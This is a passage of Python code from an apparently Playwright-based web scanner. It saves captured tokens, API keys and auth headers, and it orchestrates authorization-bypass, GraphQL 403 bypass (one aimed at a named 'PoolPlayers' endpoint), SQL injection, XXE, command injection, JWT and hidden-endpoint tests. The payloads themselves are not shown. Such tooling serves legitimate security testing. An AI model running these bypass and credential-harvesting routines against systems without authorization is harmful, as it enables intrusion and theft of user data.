                        resources.forEach(res => {
                            if (res.name && !res.name.includes(window.location.origin)) {
                                corsRequests.push({
                                    url: res.name.substring(0, 200),
                                    crossorigin: true,
                                    type: res.initiatorType
                                });
                            }
                        });
                    }
                    
                    return corsRequests;
                }""")
                if cors_info:
                    advanced_tracking_data["cors_requests"] = cors_info[:50]  # Limit to 50
            except Exception:
                pass
            
            try:
                # Capture security headers from document meta tags and CSP
                security_headers = await page.evaluate("""() => {
                    const headers = {};
                    
                    // CSP meta tag
                    const cspMeta = document.querySelector('meta[http-equiv="Content-Security-Policy"]');
                    if (cspMeta) {
                        headers.csp_meta = cspMeta.getAttribute('content');
                    }
                    
                    // Check for X-Frame-Options via X-Frame-Options meta (not standard but check)
                    const frameOptions = document.querySelector('meta[http-equiv="X-UA-Compatible"]');
                    if (frameOptions) {
                        headers.x_ua_compatible = frameOptions.getAttribute('content');
                    }
                    
                    return headers;
                }""")
                if security_headers:
                    advanced_tracking_data["security_headers"] = security_headers
            except Exception:
                pass
            
            try:
                # Detect API patterns and schema from network requests
                api_patterns = []
                
                # This will be populated from on_request/on_response events tracked during page load
                # For now, we'll analyze the collected network data
                if isinstance(network_data.get("requests"), list):
                    methods_seen = set()
                    paths_seen = {}
                    
                    for req in network_data["requests"][:100]:  # Analyze first 100 requests
                        method = req.get("method", "GET")
                        url = req.get("url", "")
                        
                        try:
                            from urllib.parse import urlparse, parse_qs
                            parsed = urlparse(url)
                            path = parsed.path
                            
                            # Detect REST patterns
                            if method not in methods_seen:
                                methods_seen.add(method)
                            
                            # Track path patterns for API detection
                            if "/api/" in path or "/v1/" in path or "/v2/" in path or "/rest/" in path:
                                if method not in paths_seen:
                                    paths_seen[method] = []
                                if len(paths_seen[method]) < 5:
                                    paths_seen[method].append(path)
                        except Exception:
                            pass
                    
                    # Build API pattern report
                    if methods_seen or paths_seen:
                        api_patterns.append({
                            "rest_methods_detected": sorted(list(methods_seen)),
                            "api_endpoints_by_method": {k: v for k, v in paths_seen.items()},
                            "likely_rest_api": len(methods_seen) > 1 or any("api" in str(v) for v in paths_seen.values())
                        })
                
                if api_patterns:
                    advanced_tracking_data["api_patterns"] = api_patterns
            except Exception:
                pass

        # After page load, attempt to retrieve bodies for collected responses
        downloaded_images = []
        saved_api_bodies = []
        try:
            for ridx, resp in enumerate(apis_responses):
                try:
                    ctype = resp.headers.get("content-type", "").lower()
                    # JSON / API responses
                    if mode["collect_apis"] and "json" in ctype:
                        try:
                            body_text = await resp.text()
                        except Exception:
                            body_text = None
                        if body_text:
                            api_dir = RUN_DIR / "api_bodies"
                            api_dir.mkdir(parents=True, exist_ok=True)
                            fname = api_dir / f"{idx:04d}_api_{ridx}.json"
                            try:
                                # Try to pretty-format JSON, fallback to raw text
                                import json as _json
                                parsed = _json.loads(body_text)
                                fname.write_text(_json.dumps(parsed, indent=2), encoding="utf-8")
                            except Exception:
                                fname.write_text(body_text, encoding="utf-8")
                            saved_api_bodies.append(str(fname.relative_to(RUN_DIR)))
                    # Image responses
                    if mode.get("collect_images") and "image" in ctype:
                        try:
                            body = await resp.body()
                            img_dir = IMAGES_DIR
                            img_dir.mkdir(parents=True, exist_ok=True)
                            # try to determine extension
                            ext = None
                            if "png" in ctype:
                                ext = "png"
                            elif "jpeg" in ctype or "jpg" in ctype:
                                ext = "jpg"
                            elif "gif" in ctype:
                                ext = "gif"
                            else:
                                # fallback to url extension
                                p = Path(urlparse(resp.url).path)
                                ext = p.suffix.lstrip('.') or "bin"
                            img_name = img_dir / f"{idx:04d}_respimg_{ridx}.{ext}"
                            img_name.write_bytes(body)
                            downloaded_images.append(str(img_name.relative_to(RUN_DIR)))
                        except Exception:
                            pass
                except Exception:
                    pass
        except Exception:
            pass

        # Build capture record
        page_data = {
            "url": url,
            "timestamp": datetime.now().isoformat(),
            "page_load_time_seconds": round(load_time, 2),
            "apis": apis_found if mode["collect_apis"] else [],
            "api_bodies": saved_api_bodies,
            "downloaded_images": downloaded_images,
            "network_summary": {
                "total_requests": len(network_data["requests"]),
                "failed_requests": len(network_data["errors"]),
                "websockets_detected": len(network_data["websockets"]),
            },
            "client_intelligence_summary": {
                "console_messages": len(client_data["console"]),
                "js_errors": len(client_data["js_errors"]),
                "has_performance_data": len(client_data["performance"]) > 0,
                "state_snapshots": len(client_data["state_snapshots"]),
            },
            "session_auth_summary": {
                "tokens_found": len(session_auth_data["tokens"]),
                "api_keys_found": len(session_auth_data["api_keys"]),
                "auth_headers_found": len(session_auth_data["auth_headers"]),
                "has_session_storage": len(session_auth_data["session_storage"]) > 0,
                "has_indexed_db": len(session_auth_data["indexed_db"]) > 0,
            },
            "page_behavior_summary": {
                "interactions": page_behavior_data.get("interactions", {}),
                "a11y_issues_found": len(page_behavior_data["a11y_issues"]),
                "third_party_scripts": len(page_behavior_data["third_party_scripts"]),
                "has_performance_data": len(page_behavior_data["performance"]) > 0,
            },
            "content_extraction_summary": {
                "structured_data_found": len(content_extraction_data["structured_data"]),
                "has_rendered_text": len(content_extraction_data.get("rendered_text", "")) > 0,
                "forms_found": len(content_extraction_data["forms"]),
                "links_found": len(content_extraction_data.get("links", {}).get("internal", [])) + 
                               len(content_extraction_data.get("links", {}).get("external", [])),
                "ctas_found": len(content_extraction_data.get("links", {}).get("ctas", [])),
            },
            "advanced_tracking_summary": {
                "pixels_found": len(advanced_tracking_data["pixels"]),
                "cors_requests": len(advanced_tracking_data.get("cors_requests", [])),
                "has_security_headers": len(advanced_tracking_data.get("security_headers", {})) > 0,
                "has_api_patterns": len(advanced_tracking_data.get("api_patterns", [])) > 0,
            },
        }
        
        # Save detailed network data
        if mode.get("collect_network") and (network_data["requests"] or network_data["errors"]):
            try:
                net_dir = RUN_DIR / "network_data"
                net_dir.mkdir(parents=True, exist_ok=True)
                net_file = net_dir / f"{idx:04d}_network.json"
                net_file.write_text(json.dumps(network_data, indent=2), encoding="utf-8")
                page_data["network_file"] = str(net_file.relative_to(RUN_DIR))
            except Exception as e:
                CliOutput.warn(f"Could not save network data: {e}", indent=1)

        # Save detailed client-side intelligence data
        if mode.get("collect_client_intelligence") and (client_data["console"] or client_data["js_errors"] or client_data["performance"]):
            try:
                client_dir = RUN_DIR / "client_intelligence"
                client_dir.mkdir(parents=True, exist_ok=True)
                client_file = client_dir / f"{idx:04d}_client_data.json"
                client_file.write_text(json.dumps(client_data, indent=2), encoding="utf-8")
                page_data["client_intelligence_file"] = str(client_file.relative_to(RUN_DIR))
            except Exception as e:
                CliOutput.warn(f"Could not save client intelligence data: {e}", indent=1)

        # Save detailed session & auth data
        if mode.get("collect_session_auth") and (session_auth_data["tokens"] or session_auth_data["api_keys"] or session_auth_data["auth_headers"] or session_auth_data["session_storage"]):
            try:
                auth_dir = RUN_DIR / "session_auth"
                auth_dir.mkdir(parents=True, exist_ok=True)
                auth_file = auth_dir / f"{idx:04d}_session_auth.json"
                auth_file.write_text(json.dumps(session_auth_data, indent=2), encoding="utf-8")
                page_data["session_auth_file"] = str(auth_file.relative_to(RUN_DIR))
            except Exception as e:
                CliOutput.warn(f"Could not save session/auth data: {e}", indent=1)

        # Save detailed page behavior data
        if mode.get("collect_page_behavior") and (page_behavior_data["interactions"] or page_behavior_data["a11y_issues"] or page_behavior_data["third_party_scripts"]):
            try:
                behavior_dir = RUN_DIR / "page_behavior"
                behavior_dir.mkdir(parents=True, exist_ok=True)
                behavior_file = behavior_dir / f"{idx:04d}_page_behavior.json"
                behavior_file.write_text(json.dumps(page_behavior_data, indent=2), encoding="utf-8")
                page_data["page_behavior_file"] = str(behavior_file.relative_to(RUN_DIR))
            except Exception as e:
                CliOutput.warn(f"Could not save page behavior data: {e}", indent=1)

        # Save detailed content extraction data
        if mode.get("collect_content_extraction") and (content_extraction_data["structured_data"] or content_extraction_data["rendered_text"] or content_extraction_data["forms"] or content_extraction_data["links"]):
            try:
                extraction_dir = RUN_DIR / "content_extraction"
                extraction_dir.mkdir(parents=True, exist_ok=True)
                extraction_file = extraction_dir / f"{idx:04d}_content_extraction.json"
                extraction_file.write_text(json.dumps(content_extraction_data, indent=2, default=str), encoding="utf-8")
                page_data["content_extraction_file"] = str(extraction_file.relative_to(RUN_DIR))
            except Exception as e:
                CliOutput.warn(f"Could not save content extraction data: {e}", indent=1)

        # Save detailed advanced tracking data
        if mode.get("collect_advanced_tracking") and (advanced_tracking_data["pixels"] or advanced_tracking_data["cors_requests"] or advanced_tracking_data.get("security_headers") or advanced_tracking_data.get("api_patterns")):
            try:
                tracking_dir = RUN_DIR / "advanced_tracking"
                tracking_dir.mkdir(parents=True, exist_ok=True)
                tracking_file = tracking_dir / f"{idx:04d}_advanced_tracking.json"
                tracking_file.write_text(json.dumps(advanced_tracking_data, indent=2, default=str), encoding="utf-8")
                page_data["advanced_tracking_file"] = str(tracking_file.relative_to(RUN_DIR))
            except Exception as e:
                CliOutput.warn(f"Could not save advanced tracking data: {e}", indent=1)

        # Test GraphQL/Direct API endpoints if enabled
        if mode.get("collect_graphql_direct"):
            try:
                CliOutput.info("Testing GraphQL endpoints with authenticated session...", indent=1)
                graphql_results = await test_graphql_endpoints(page, context)
                
                if graphql_results:
                    graphql_dir = RUN_DIR / "graphql_tests"
                    graphql_dir.mkdir(parents=True, exist_ok=True)
                    graphql_file = graphql_dir / f"{idx:04d}_graphql_results.json"
                    graphql_file.write_text(json.dumps(graphql_results, indent=2, default=str), encoding="utf-8")
                    page_data["graphql_results_file"] = str(graphql_file.relative_to(RUN_DIR))
                    
                    # Add summary to page data
                    accessible_endpoints = sum(1 for result in graphql_results if result["accessible"])
                    page_data["graphql_summary"] = {
                        "endpoints_tested": len(graphql_results),
                        "accessible_endpoints": accessible_endpoints,
                        "tests_file": str(graphql_file.relative_to(RUN_DIR))
                    }
                    CliOutput.success(f"GraphQL testing complete: {accessible_endpoints}/{len(graphql_results)} endpoints accessible", indent=1)
            except Exception as e:
                CliOutput.warn(f"Could not test GraphQL endpoints: {e}", indent=1)

        # Test authorization bypass techniques if enabled
        if mode.get("collect_auth_bypass"):
            try:
                CliOutput.info("Testing authorization bypass techniques...", indent=1)
                bypass_results = await test_auth_bypass(page, context)
                
                if bypass_results:
                    bypass_dir = RUN_DIR / "auth_bypass_tests"
                    bypass_dir.mkdir(parents=True, exist_ok=True)
                    bypass_file = bypass_dir / f"{idx:04d}_auth_bypass_results.json"
                    bypass_file.write_text(json.dumps(bypass_results, indent=2, default=str), encoding="utf-8")
                    page_data["auth_bypass_results_file"] = str(bypass_file.relative_to(RUN_DIR))
                    
                    # Add summary to page data
                    total_vulnerable = sum(1 for result in bypass_results if result["vulnerable_to_bypass"])
                    total_bypass_attempts = sum(result["total_attempts"] for result in bypass_results)
                    successful_bypasses = sum(len(result["successful_bypasses"]) for result in bypass_results)
                    
                    page_data["auth_bypass_summary"] = {
                        "endpoints_tested": len(bypass_results),
                        "vulnerable_endpoints": total_vulnerable,
                        "total_bypass_attempts": total_bypass_attempts,
                        "successful_bypasses": successful_bypasses,
                        "results_file": str(bypass_file.relative_to(RUN_DIR))
                    }
                    
                    if successful_bypasses > 0:
                        CliOutput.error(f"⚠️  Auth bypass testing: {successful_bypasses} SUCCESSFUL BYPASSES FOUND!", indent=1)
                    else:
                        CliOutput.success(f"Auth bypass testing complete: {successful_bypasses} successful bypasses (0 = good)", indent=1)
            except Exception as e:
                CliOutput.warn(f"Could not test auth bypass: {e}", indent=1)

        # Test advanced GraphQL 403 bypass techniques if enabled
        if mode.get("collect_advanced_graphql_bypass"):
            try:
                CliOutput.info("Testing advanced GraphQL 403 bypass techniques...", indent=1)
                advanced_bypass_results = await test_advanced_graphql_bypass(page, context)
                
                if advanced_bypass_results:
                    advanced_bypass_dir = RUN_DIR / "advanced_graphql_bypass_tests"
                    advanced_bypass_dir.mkdir(parents=True, exist_ok=True)
                    advanced_bypass_file = advanced_bypass_dir / f"{idx:04d}_advanced_graphql_bypass_results.json"
                    advanced_bypass_file.write_text(json.dumps(advanced_bypass_results, indent=2, default=str), encoding="utf-8")
                    page_data["advanced_graphql_bypass_results_file"] = str(advanced_bypass_file.relative_to(RUN_DIR))
                    
                    # Add summary to page data
                    total_vulnerable = sum(1 for result in advanced_bypass_results if result["vulnerable_to_advanced_bypass"])
                    total_bypass_attempts = sum(result["total_attempts"] for result in advanced_bypass_results)
                    successful_bypasses = sum(len(result["successful_bypasses"]) for result in advanced_bypass_results)
                    
                    page_data["advanced_graphql_bypass_summary"] = {
                        "endpoints_tested": len(advanced_bypass_results),
                        "vulnerable_endpoints": total_vulnerable,
                        "total_bypass_attempts": total_bypass_attempts,
                        "successful_bypasses": successful_bypasses,
                        "results_file": str(advanced_bypass_file.relative_to(RUN_DIR))
                    }
                    
                    if successful_bypasses > 0:
                        CliOutput.error(f"⚠️  Advanced GraphQL bypass testing: {successful_bypasses} SUCCESSFUL BYPASSES FOUND!", indent=1)
                    else:
                        CliOutput.success(f"Advanced GraphQL bypass testing complete: {successful_bypasses} successful bypasses (0 = good)", indent=1)
            except Exception as e:
                CliOutput.warn(f"Could not test advanced GraphQL bypass: {e}", indent=1)

        # Test PoolPlayers GraphQL endpoint bypass if enabled
        if mode.get("collect_gql_poolplayers_bypass"):
            try:
                CliOutput.info("Testing PoolPlayers GraphQL bypass techniques...", indent=1)
                poolplayers_results = await test_gql_poolplayers_bypass(page, context)
                
                if poolplayers_results:
                    poolplayers_dir = RUN_DIR / "gql_poolplayers_bypass_tests"
                    poolplayers_dir.mkdir(parents=True, exist_ok=True)
                    poolplayers_file = poolplayers_dir / f"{idx:04d}_poolplayers_bypass_results.json"
                    poolplayers_file.write_text(json.dumps(poolplayers_results, indent=2, default=str), encoding="utf-8")
                    page_data["poolplayers_bypass_results_file"] = str(poolplayers_file.relative_to(RUN_DIR))
                    
                    # Add summary to page data
                    page_data["poolplayers_bypass_summary"] = {
                        "endpoint": poolplayers_results.get("endpoint"),
                        "total_attempts": poolplayers_results.get("total_attempts", 0),
                        "successful_bypasses": poolplayers_results.get("successful_count", 0),
                        "vulnerable": poolplayers_results.get("vulnerable", False),
                        "results_file": str(poolplayers_file.relative_to(RUN_DIR))
                    }
                    
                    if poolplayers_results.get("successful_count", 0) > 0:
                        CliOutput.error(f"⚠️  PoolPlayers GraphQL bypass: {poolplayers_results.get('successful_count', 0)} SUCCESSFUL BYPASSES FOUND!", indent=1)
                    else:
                        CliOutput.success(f"PoolPlayers GraphQL bypass testing complete: {poolplayers_results.get('successful_count', 0)} successful bypasses (0 = good)", indent=1)
            except Exception as e:
                CliOutput.warn(f"Could not test PoolPlayers GraphQL bypass: {e}", indent=1)

        # Test form auto-fill detection if enabled
        if mode.get("collect_form_autodetection"):
            try:
                CliOutput.info("Detecting auto-fillable forms...", indent=1)
                form_results = await test_form_autodetection(page, context)
                
                if form_results and form_results["total_forms"] > 0:
                    forms_dir = RUN_DIR / "form_autodetection_tests"
                    forms_dir.mkdir(parents=True, exist_ok=True)
                    forms_file = forms_dir / f"{idx:04d}_form_autodetection_results.json"
                    forms_file.write_text(json.dumps(form_results, indent=2, default=str), encoding="utf-8")
                    page_data["form_autodetection_results_file"] = str(forms_file.relative_to(RUN_DIR))
                    
                    page_data["form_autodetection_summary"] = {
                        "total_forms": form_results.get("total_forms", 0),
                        "autodetectable_forms": len(form_results.get("autodetectable_forms", [])),
                        "total_fields": len(form_results.get("form_fields", [])),
                        "password_manager_compatible": form_results.get("password_manager_compatible", False),
                        "results_file": str(forms_file.relative_to(RUN_DIR))
                    }
                    
                    CliOutput.success(f"Form auto-detection: Found {form_results.get('total_forms', 0)} forms, {len(form_results.get('autodetectable_forms', []))} auto-detectable", indent=1)
            except Exception as e:
                CliOutput.warn(f"Could not detect forms: {e}", indent=1)

        # Test API response caching if enabled
        if mode.get("collect_response_caching"):
            try:
                CliOutput.info("Analyzing API response caching...", indent=1)
                caching_results = await test_response_caching_analysis(page, context)
                
                if caching_results and caching_results["total_requests"] > 0:
                    caching_dir = RUN_DIR / "response_caching_analysis"
                    caching_dir.mkdir(parents=True, exist_ok=True)
                    caching_file = caching_dir / f"{idx:04d}_caching_analysis_results.json"
                    caching_file.write_text(json.dumps(caching_results, indent=2, default=str), encoding="utf-8")
                    page_data["caching_analysis_results_file"] = str(caching_file.relative_to(RUN_DIR))
                    
                    page_data["caching_analysis_summary"] = {
                        "total_requests_analyzed": caching_results.get("total_requests", 0),
                        "cached_responses": len(caching_results.get("cached_responses", [])),
                        "vulnerable_caching": len(caching_results.get("vulnerable_caching", [])),
                        "etag_count": len(caching_results.get("etag_analysis", [])),
                        "results_file": str(caching_file.relative_to(RUN_DIR))
                    }
                    
                    vulnerable = len(caching_results.get("vulnerable_caching", []))
                    if vulnerable > 0:
                        CliOutput.error(f"⚠️  Response caching: {vulnerable} VULNERABLE CACHING ISSUES FOUND!", indent=1)
                    else:
                        CliOutput.success(f"Response caching analysis: {caching_results.get('total_requests', 0)} requests analyzed", indent=1)
            except Exception as e:
                CliOutput.warn(f"Could not analyze caching: {e}", indent=1)

        # Test data leakage detection if enabled
        if mode.get("collect_data_leakage"):
            try:
                CliOutput.info("Scanning for data leakage (PII)...", indent=1)
                page_html = await page.content()
                leakage_results = await detect_data_leakage(page_html, captured_apis)
                
                if leakage_results and len(leakage_results.get("found_pii", [])) > 0:
                    leakage_dir = RUN_DIR / "data_leakage_findings"
                    leakage_dir.mkdir(parents=True, exist_ok=True)
                    leakage_file = leakage_dir / f"{idx:04d}_data_leakage_results.json"
                    leakage_file.write_text(json.dumps(leakage_results, indent=2, default=str), encoding="utf-8")
                    page_data["data_leakage_results_file"] = str(leakage_file.relative_to(RUN_DIR))
                    
                    page_data["data_leakage_summary"] = {
                        "pii_found": len(leakage_results.get("found_pii", [])),
                        "pii_types": leakage_results.get("pii_summary", {}),
                        "risk_level": leakage_results.get("risk_level", "LOW"),
                        "results_file": str(leakage_file.relative_to(RUN_DIR))
                    }
                    
                    if leakage_results.get("risk_level") in ["CRITICAL", "HIGH"]:
                        CliOutput.error(f"⚠️  Data leakage: {len(leakage_results.get('found_pii', []))} PII ITEMS FOUND ({leakage_results.get('risk_level')} RISK)!", indent=1)
                    else:
                        CliOutput.success(f"Data leakage scan: {len(leakage_results.get('found_pii', []))} PII items found (Risk: {leakage_results.get('risk_level')})", indent=1)
            except Exception as e:
                CliOutput.warn(f"Could not detect data leakage: {e}", indent=1)

        # Test hidden/debug endpoints discovery if enabled
        if mode.get("collect_hidden_endpoints"):
            try:
                CliOutput.info("Discovering hidden/debug endpoints...", indent=1)
                hidden_results = await discover_hidden_endpoints(page, url)
                
                if hidden_results and len(hidden_results.get("accessible", [])) > 0:
                    hidden_dir = RUN_DIR / "hidden_endpoints_discovery"
                    hidden_dir.mkdir(parents=True, exist_ok=True)
                    hidden_file = hidden_dir / f"{idx:04d}_hidden_endpoints_results.json"
                    hidden_file.write_text(json.dumps(hidden_results, indent=2, default=str), encoding="utf-8")
                    page_data["hidden_endpoints_results_file"] = str(hidden_file.relative_to(RUN_DIR))
                    
                    page_data["hidden_endpoints_summary"] = {
                        "total_probed": hidden_results.get("total_probed", 0),
                        "accessible_endpoints": len(hidden_results.get("accessible", [])),
                        "redirect_endpoints": len(hidden_results.get("redirects", [])),
                        "results_file": str(hidden_file.relative_to(RUN_DIR))
                    }
                    
                    accessible = len(hidden_results.get("accessible", []))
                    if accessible > 0:
                        CliOutput.error(f"⚠️  Hidden endpoints: {accessible} ACCESSIBLE ENDPOINTS FOUND!", indent=1)
                    else:
                        CliOutput.success(f"Hidden endpoints discovery: {hidden_results.get('total_probed', 0)} paths probed", indent=1)
            except Exception as e:
                CliOutput.warn(f"Could not discover hidden endpoints: {e}", indent=1)

        # Test CORS policy analysis if enabled
        if mode.get("collect_cors_analysis"):
            try:
                CliOutput.info("Analyzing CORS policies...", indent=1)
                cors_results = await test_cors_analysis(page, context, captured_apis)
                
                if cors_results and cors_results.get("endpoints_analyzed", 0) > 0:
                    cors_dir = RUN_DIR / "cors_analysis"
                    cors_dir.mkdir(parents=True, exist_ok=True)
                    cors_file = cors_dir / f"{idx:04d}_cors_analysis_results.json"
                    cors_file.write_text(json.dumps(cors_results, indent=2, default=str), encoding="utf-8")
                    page_data["cors_analysis_results_file"] = str(cors_file.relative_to(RUN_DIR))
                    
                    page_data["cors_analysis_summary"] = {
                        "endpoints_with_cors": cors_results.get("cors_summary", {}).get("endpoints_with_cors", 0),
                        "vulnerable_endpoints": len(cors_results.get("vulnerable_patterns", [])),
                        "total_analyzed": cors_results.get("endpoints_analyzed", 0),
                        "results_file": str(cors_file.relative_to(RUN_DIR))
                    }
                    
                    vulnerable = len(cors_results.get("vulnerable_patterns", []))
                    if vulnerable > 0:
                        CliOutput.error(f"⚠️  CORS Policy: {vulnerable} VULNERABLE CONFIGURATIONS FOUND!", indent=1)
                    else:
                        CliOutput.success(f"CORS analysis: {cors_results.get('endpoints_analyzed', 0)} endpoints analyzed", indent=1)
            except Exception as e:
                CliOutput.warn(f"Could not analyze CORS: {e}", indent=1)

        # Test JWT token analysis if enabled
        if mode.get("collect_jwt_analysis"):
            try:
                CliOutput.info("Analyzing JWT tokens...", indent=1)
                jwt_results = await test_jwt_analysis(page, context)
                
                if jwt_results and len(jwt_results.get("tokens_found", [])) > 0:
                    jwt_dir = RUN_DIR / "jwt_analysis"
                    jwt_dir.mkdir(parents=True, exist_ok=True)
                    jwt_file = jwt_dir / f"{idx:04d}_jwt_analysis_results.json"
                    jwt_file.write_text(json.dumps(jwt_results, indent=2, default=str), encoding="utf-8")
                    page_data["jwt_analysis_results_file"] = str(jwt_file.relative_to(RUN_DIR))
                    
                    page_data["jwt_analysis_summary"] = {
                        "tokens_found": jwt_results.get("analysis_summary", {}).get("total_tokens", 0),
                        "vulnerable_tokens": jwt_results.get("analysis_summary", {}).get("vulnerable_tokens", 0),
                        "issues_found": jwt_results.get("analysis_summary", {}).get("issues_found", 0),
                        "results_file": str(jwt_file.relative_to(RUN_DIR))
                    }
                    
                    vulnerable = jwt_results.get("analysis_summary", {}).get("vulnerable_tokens", 0)
                    if vulnerable > 0:
                        CliOutput.error(f"⚠️  JWT Analysis: {vulnerable} VULNERABLE TOKENS FOUND!", indent=1)
                    else:
                        CliOutput.success(f"JWT analysis: {jwt_results.get('analysis_summary', {}).get('total_tokens', 0)} tokens found", indent=1)
            except Exception as e:
                CliOutput.warn(f"Could not analyze JWT tokens: {e}", indent=1)

        # Test API key exposure detection if enabled
        if mode.get("collect_api_key_exposure"):
            try:
                CliOutput.info("Detecting API key exposure...", indent=1)
                exposure_results = await test_api_key_exposure(page, context)
                
                if exposure_results and len(exposure_results.get("exposed_keys", [])) > 0:
                    exposure_dir = RUN_DIR / "api_key_exposure"
                    exposure_dir.mkdir(parents=True, exist_ok=True)
                    exposure_file = exposure_dir / f"{idx:04d}_api_key_exposure_results.json"
                    exposure_file.write_text(json.dumps(exposure_results, indent=2, default=str), encoding="utf-8")
                    page_data["api_key_exposure_results_file"] = str(exposure_file.relative_to(RUN_DIR))
                    
                    page_data["api_key_exposure_summary"] = {
                        "exposed_keys": exposure_results.get("exposure_summary", {}).get("total_exposed_keys", 0),
                        "unique_locations": exposure_results.get("exposure_summary", {}).get("unique_locations", 0),
                        "key_types": exposure_results.get("exposure_summary", {}).get("key_types_exposed", []),
                        "results_file": str(exposure_file.relative_to(RUN_DIR))
                    }
                    
                    exposed = exposure_results.get("exposure_summary", {}).get("total_exposed_keys", 0)
                    if exposed > 0:
                        CliOutput.error(f"⚠️  API Key Exposure: {exposed} EXPOSED KEYS FOUND!", indent=1)
                    else:
                        CliOutput.success(f"API key exposure: No exposed keys detected", indent=1)
            except Exception as e:
                CliOutput.warn(f"Could not detect API key exposure: {e}", indent=1)

        # Test SQL injection if enabled
        if mode.get("collect_sqli_testing"):
            try:
                CliOutput.info("Testing for SQL injection vulnerabilities...", indent=1)
                sqli_results = await test_sqli_testing(page, context)
                
                if sqli_results and sqli_results.get("parameters_tested", 0) > 0:
                    sqli_dir = RUN_DIR / "sqli_testing"
                    sqli_dir.mkdir(parents=True, exist_ok=True)
                    sqli_file = sqli_dir / f"{idx:04d}_sqli_testing_results.json"
                    sqli_file.write_text(json.dumps(sqli_results, indent=2, default=str), encoding="utf-8")
                    page_data["sqli_testing_results_file"] = str(sqli_file.relative_to(RUN_DIR))
                    
                    page_data["sqli_testing_summary"] = {
                        "parameters_tested": sqli_results.get("summary", {}).get("parameters_analyzed", 0),
                        "potentially_vulnerable": sqli_results.get("summary", {}).get("potentially_vulnerable", 0),
                        "results_file": str(sqli_file.relative_to(RUN_DIR))
                    }
                    
                    vulnerable = sqli_results.get("summary", {}).get("potentially_vulnerable", 0)
                    if vulnerable > 0:
                        CliOutput.error(f"⚠️  SQL Injection: {vulnerable} POTENTIALLY VULNERABLE PARAMETERS FOUND!", indent=1)
                    else:
                        CliOutput.success(f"SQL injection testing: {sqli_results.get('summary', {}).get('parameters_analyzed', 0)} parameters analyzed", indent=1)
            except Exception as e:
                CliOutput.warn(f"Could not test SQL injection: {e}", indent=1)

        # Test XXE injection if enabled
        if mode.get("collect_xxe_injection"):
            try:
                CliOutput.info("Testing for XXE injection vulnerabilities...", indent=1)
                xxe_results = await test_xxe_injection(page, context)
                
                if xxe_results and len(xxe_results.get("xml_endpoints", [])) > 0:
                    xxe_dir = RUN_DIR / "xxe_injection_testing"
                    xxe_dir.mkdir(parents=True, exist_ok=True)
                    xxe_file = xxe_dir / f"{idx:04d}_xxe_injection_results.json"
                    xxe_file.write_text(json.dumps(xxe_results, indent=2, default=str), encoding="utf-8")
                    page_data["xxe_injection_results_file"] = str(xxe_file.relative_to(RUN_DIR))
                    
                    page_data["xxe_injection_summary"] = {
                        "xml_endpoints_found": xxe_results.get("summary", {}).get("xml_endpoints_found", 0),
                        "test_payloads_available": xxe_results.get("summary", {}).get("test_payloads_available", 0),
                        "results_file": str(xxe_file.relative_to(RUN_DIR))
                    }
                    
                    endpoints = xxe_results.get("summary", {}).get("xml_endpoints_found", 0)
                    if endpoints > 0:
                        CliOutput.error(f"⚠️  XXE Injection: {endpoints} XML ENDPOINTS FOUND - Manual testing recommended!", indent=1)
                    else:
                        CliOutput.success(f"XXE injection testing: {endpoints} XML endpoints identified", indent=1)
            except Exception as e:
                CliOutput.warn(f"Could not test XXE injection: {e}", indent=1)

        # Test command injection if enabled
        if mode.get("collect_command_injection"):
            try:
                CliOutput.info("Testing for command injection vulnerabilities...", indent=1)
                command_injection_results = await test_command_injection(page, context)
                
                if command_injection_results and command_injection_results.get("parameters_analyzed", 0) > 0:
                    ci_dir = RUN_DIR / "command_injection_testing"
                    ci_dir.mkdir(parents=True, exist_ok=True)
                    ci_file = ci_dir / f"{idx:04d}_command_injection_results.json"
                    ci_file.write_text(json.dumps(command_injection_results, indent=2, default=str), encoding="utf-8")
                    page_data["command_injection_results_file"] = str(ci_file.relative_to(RUN_DIR))
                    
                    page_data["command_injection_summary"] = {
                        "parameters_tested": command_injection_results.get("summary", {}).get("parameters_tested", 0),
                        "potentially_injectable": command_injection_results.get("summary", {}).get("potentially_injectable", 0),
                        "results_file": str(ci_file.relative_to(RUN_DIR))
                    }
                    
                    vulnerable = command_injection_results.get("summary", {}).get("potentially_injectable", 0)
                    if vulnerable > 0:
                        CliOutput.error(f"⚠️  Command Injection: {vulnerable} POTENTIALLY INJECTABLE PARAMETERS FOUND!", indent=1)
                    else:
                        CliOutput.success(f"Command injection testing: {command_injection_results.get('summary', {}).get('parameters_tested', 0)} parameters analyzed", indent=1)
            except Exception as e:
                CliOutput.warn(f"Could not test command injection: {e}", indent=1)

        # Test GraphQL authorization bypass if enabled
        if mode.get("collect_graphql_authz_bypass"):
            try:
                CliOutput.info("Testing GraphQL authorization boundaries...", indent=1)
                authz_bypass_results = await test_graphql_authz_bypass(page, context, apis_found)
                
                if authz_bypass_results and authz_bypass_results.get("graphql_endpoint"):
                    authz_dir = RUN_DIR / "graphql_authz_bypass_testing"
                    authz_dir.mkdir(parents=True, exist_ok=True)
                    authz_file = authz_dir / f"{idx:04d}_graphql_authz_bypass_results.json"
                    authz_file.write_text(json.dumps(authz_bypass_results, indent=2, default=str), encoding="utf-8")
                    page_data["graphql_authz_bypass_results_file"] = str(authz_file.relative_to(RUN_DIR))
                    
                    # Summarize findings
                    vulnerabilities = len(authz_bypass_results.get("cross_user_access", {}).get("vulnerabilities", []))
                    introspection_enabled = authz_bypass_results.get("schema_introspection", {}).get("enabled", False)
                    mutations_found = len(authz_bypass_results.get("mutation_discovery", {}).get("mutations_found", []))
                    
                    page_data["graphql_authz_bypass_summary"] = {
                        "endpoint": authz_bypass_results.get("graphql_endpoint"),
                        "authorization_vulnerabilities": vulnerabilities,
                        "introspection_enabled": introspection_enabled,
                        "mutations_discovered": mutations_found,
                        "security_findings": len(authz_bypass_results.get("security_findings", [])),
                        "results_file": str(authz_file.relative_to(RUN_DIR))
                    }
                    
                    if vulnerabilities > 0:
                        CliOutput.error(f"⚠️  GraphQL Authorization Bypass: {vulnerabilities} CRITICAL VULNERABILITIES FOUND!", indent=1)
                    elif introspection_enabled:
                        CliOutput.warn(f"GraphQL Authorization: Introspection enabled, {mutations_found} mutations discovered", indent=1)
                    else:
                        CliOutput.success(f"GraphQL authorization testing: No direct vulnerabilities detected", indent=1)
            except Exception as e:
                CliOutput.warn(f"Could not test GraphQL authorization: {e}", indent=1)

        # Capture screenshot if enabled
        if mode["collect_apis"] or mode["collect_images"] or mode["collect_dom"]:
            try:
                shot_path = IMAGES_DIR / f"{idx:04d}_screenshot.png"
                IMAGES_DIR.mkdir(parents=True, exist_ok=True)
                await page.screenshot(path=str(shot_path))
                page_data["screenshot"] = str(shot_path.relative_to(RUN_DIR))
            except Exception:
                pass

